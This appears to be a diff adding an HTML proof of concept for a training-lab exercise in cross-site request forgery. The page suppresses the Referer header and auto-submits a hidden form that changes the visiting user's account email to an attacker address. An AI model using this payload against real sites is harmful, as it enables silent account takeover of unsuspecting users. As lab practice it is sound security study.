@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="referrer" content="never"> <!-- This meta tag prevents the Referer header from being sent -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="https://0a19004c039ecba9edf160d6009f0033.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="pwned@attacker.com">
+    </form>
+    <script>
+        document.forms[0].submit(); // Automatically submit the form
+    </script>
+</body>
+</html>
